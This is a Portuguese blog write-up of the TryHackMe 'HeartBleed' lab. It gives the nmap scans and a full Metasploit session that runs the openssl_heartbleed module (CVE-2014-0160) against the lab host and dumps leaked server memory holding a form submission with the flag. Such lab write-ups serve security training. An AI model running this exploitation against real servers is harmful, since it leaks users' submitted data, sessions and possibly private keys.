---
title: 'TryHackMe: HeartBleed'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, TLS, SSL, Nmap, Metasploit]
image:
  path: assets/images/tryhackme/heartbleed/room.png
---

## Sobre o desafio

Lendo alguns textos do tryhackme fica claro que a vulnerabilidade está relacionada com o certificado SSL/TLS do host. O código foi escrito em C e aparentemente a falha está relacionada com um tamanho arbitrário que o usuário consegue enviar para o servidor. Se o usuário enviar o tamanho 0 aparentemente ocorre um vazamento de informações do servidor.

Após abrir o link no browser me deparei com uma música legalzinha.

Logo em cima do browser, no cadeado já é possível perceber que a conexão não é segura e clicando nele podemos verificar que a versão é TLS 1.2 (vulnerável)

## Nmap Scan
```
nmap -p- -T4 <ip_alvo>

Nmap scan report for ec2-34-252-227-99.eu-west-1.compute.amazonaws.com (34.252.227.99)
Host is up (0.20s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE    SERVICE
19/tcp    filtered chargen
22/tcp    open     ssh
25/tcp    filtered smtp
111/tcp   open     rpcbind
443/tcp   open     https
52429/tcp open     unknown
Nmap done: 1 IP address (1 host up) scanned in 827.26 seconds

```

Rodando Script nmap para descobrir versões TLS e SSL:

```
nmap --script ssl-enum-ciphers -p 19,22,25,111,443,52429 <ip_alvo>

Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 14:48 -03
Nmap scan report for ec2-34-252-227-99.eu-west-1.compute.amazonaws.com (34.252.227.99)
Host is up (0.29s latency).

PORT      STATE    SERVICE
19/tcp    filtered chargen
22/tcp    open     ssh
25/tcp    filtered smtp
111/tcp   open     rpcbind
443/tcp   open     https
| ssl-enum-ciphers: 
|   TLSv1.0: 
|     ciphers: 
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.1: 
|     ciphers: 
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.2: 
|     ciphers: 
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|_  least strength: C
52429/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds

```

Aqui está claro que a porta 443 é a porta suscetível. está aceitando TLS 1.0, 1.1 e 1.2

Abrindo o metasploit framework e pesquisando pelo CVE-2014-0160, executei o script contra o host na porta 443 e obtive acesso.

```
[i] Database already started
[i] The database appears to be already configured, skipping initialization
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.45-dev                          ]
+ -- --=[ 2490 exploits - 1281 auxiliary - 431 post       ]
+ -- --=[ 1466 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search CVE-2014–0160
[-] No results from search
msf6 > search 2014-0160

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   2    \_ action: DUMP                                 .                .       .      Dump memory contents to loot
   3    \_ action: KEYS                                 .                .       .      Recover private keys from memory
   4    \_ action: SCAN                                 .                .       .      Check hosts for vulnerability


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/ssl/openssl_heartbleed
After interacting with a module you can manually set a ACTION with set ACTION 'SCAN'

msf6 > use 1
[*] Using action SCAN - view all 3 actions with the show actions command
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                cs/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JA
                                                BBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 34.252.227.99
RHOSTS => 34.252.227.99
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > check
[*] 34.252.227.99:443 - The target appears to be vulnerable.
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
[+] 34.252.227.99:443     - Heartbeat response with leak, 42835 bytes
[*] 34.252.227.99:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
[*] 34.252.227.99:443     - Leaking heartbeat response #1
[*] 34.252.227.99:443     - Sending Client Hello...
[*] 34.252.227.99:443     - SSL record #1:
[*] 34.252.227.99:443     -     Type:    22
[*] 34.252.227.99:443     -     Version: 0x0301
[*] 34.252.227.99:443     -     Length:  86
[*] 34.252.227.99:443     -     Handshake #1:
[*] 34.252.227.99:443     -             Length: 82
[*] 34.252.227.99:443     -             Type:   Server Hello (2)
[*] 34.252.227.99:443     -             Server Hello Version:           0x0301
[*] 34.252.227.99:443     -             Server Hello random data:       493d4c0d2cd07c1636cd7067903e4fa21b2d60503c50101799f2b853fca19379
[*] 34.252.227.99:443     -             Server Hello Session ID length: 32
[*] 34.252.227.99:443     -             Server Hello Session ID:        59097fa03f297710ca4c18b862e05053112ace3bd83bdfab95af96b65f313b77
[*] 34.252.227.99:443     - SSL record #2:
[*] 34.252.227.99:443     -     Type:    22
[*] 34.252.227.99:443     -     Version: 0x0301
[*] 34.252.227.99:443     -     Length:  951
[*] 34.252.227.99:443     -     Handshake #1:
[*] 34.252.227.99:443     -             Length: 947
[*] 34.252.227.99:443     -             Type:   Certificate Data (11)
[*] 34.252.227.99:443     -             Certificates length: 944
[*] 34.252.227.99:443     -             Data length: 947
[*] 34.252.227.99:443     -             Certificate #1:
[*] 34.252.227.99:443     -                     Certificate #1: Length: 941
[*] 34.252.227.99:443     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007f38db663df0>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
[*] 34.252.227.99:443     - SSL record #3:
[*] 34.252.227.99:443     -     Type:    22
[*] 34.252.227.99:443     -     Version: 0x0301
[*] 34.252.227.99:443     -     Length:  331
[*] 34.252.227.99:443     -     Handshake #1:
[*] 34.252.227.99:443     -             Length: 327
[*] 34.252.227.99:443     -             Type:   Server Key Exchange (12)
[*] 34.252.227.99:443     - SSL record #4:
[*] 34.252.227.99:443     -     Type:    22
[*] 34.252.227.99:443     -     Version: 0x0301
[*] 34.252.227.99:443     -     Length:  4
[*] 34.252.227.99:443     -     Handshake #1:
[*] 34.252.227.99:443     -             Length: 0
[*] 34.252.227.99:443     -             Type:   Server Hello Done (14)
[*] 34.252.227.99:443     - Sending Heartbeat...
[*] 34.252.227.99:443     - Heartbeat response, 42835 bytes
[+] 34.252.227.99:443     - Heartbeat response with leak, 42835 bytes
[*] 34.252.227.99:443     - Printable info leaked:
......g.k..X..a+.F..=9.oW ....f....B....f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}.."...8........Xte: same-origin..Accept-Encoding: identity..Priority: u=4....K0.[...4......C|p.'...?7S...~#......8A....^..;.....(.@cu....%.G..).%....18.n....K.t.#.Tl.......4m0oy...e.q!Z......EJ...!s......z.mvq|....X....W3......k....F..{.....u....;.nf........il..aX.J$H.P..r.x]gcD[D..}....{.....u.0r{..4..+)%s.6vCD....D..%..5..g....f..(...Hg.... ...1..:4..WH>y.....q...rP.:...g..9..{.d.......~.. "...N.....J.ep{....P..V.F. ....[...Vi'...*g.+o_..m:S..U.Zu..................................................................................................................................... repeated 15312 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@...... M/............A.yG.y.9..a...."gx:.\#..../....\......t..}.....^V>)..fU..7$.........A#..0...{E.....&.....=2S..Y..\-N....;.#...ApB.R1:..+Q.X.e.2D....b.*.?Ju0T..=.C.n&.1.H%.j...y........A.....!...>'............/q...........U..........i...6.y.6}.'..A.a....O.|....zg......d ...........|.U,...m?8.{h.....>]...oe7Z.......S.............. ...g.s8\5..OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C..................................................................................................................................... repeated 3312 times .....................................................................................................................................@..........V...R...=[.7.......6#r1..7...EZ).%E...4 .....i..]!.Q.......TZk..".e&..N...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A..R_.........a:..?#....*+..?e...>.!k...........,...H..8....'k..=...Qvh.....C.....I ".;.B.W[#Z|k?.tE.C....I"}.....K....|p.0.O..A+x~..*DLU._.E..R\.J...K.....>w"1v.....X.K..J.....Q.c......=...j..{..O[...!.O.....u......s...]../s.l.wG.>,.nY.N.@K...t*.H..],F..Y..?..PK.....E.....*3.'(...xR.....tJsv"a.....]......}...Hy.Xwk..Bw.e..................................................................................................................................... repeated 3537 times .....................................................................................................................................
[*] 34.252.227.99:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


No corpo do texto, é possivel encontrar a flag.
